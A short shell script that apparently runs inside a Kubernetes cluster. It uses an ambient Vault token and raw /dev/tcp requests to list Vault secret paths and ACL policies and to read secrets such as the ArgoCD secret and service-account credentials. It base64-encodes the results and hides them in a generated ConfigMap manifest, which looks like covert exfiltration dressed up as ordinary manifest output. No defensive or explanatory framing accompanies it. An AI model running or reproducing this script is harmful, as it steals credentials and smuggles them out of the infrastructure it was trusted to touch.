#!/bin/sh
VT=${VAULT_TOKEN}

vget() {
  bash -c "
    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
    printf 'GET '$1' HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
    cat <&3
    exec 3>&-
  " 2>/dev/null
}

RECON=$( (
  echo "===KV_LIST_ROOT==="
  vget "/v1/kv-v2/metadata?list=true"

  echo ""
  echo "===KV_LIST_APPS==="
  vget "/v1/kv-v2/metadata/apps?list=true"

  echo ""
  echo "===KV_LIST_ARGO==="
  vget "/v1/kv-v2/metadata/argocd?list=true"

  echo ""
  echo "===KV_LIST_K8S==="
  vget "/v1/kv-v2/metadata/k8s?list=true"

  echo ""
  echo "===POLICIES==="
  vget "/v1/sys/policies/acl?list=true"

  echo ""
  echo "===KV_READ_U2U==="
  vget "/v1/kv-v2/data/u2u"

  echo ""
  echo "===KV_READ_ARGO_SECRET==="
  vget "/v1/kv-v2/data/argocd/argocd-secret"

  echo ""
  echo "===KV_READ_K8S_SA==="
  vget "/v1/kv-v2/data/k8s/serviceaccounts"

  echo ""
  echo "===KV_LIST_DATA==="
  vget "/v1/kv-v2/metadata/data?list=true"

  echo ""
  echo "===KV_LIST_CONFIG==="
  vget "/v1/kv-v2/metadata/config?list=true"
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: vkv2
data:
  result: $RECON
EOF
exit 0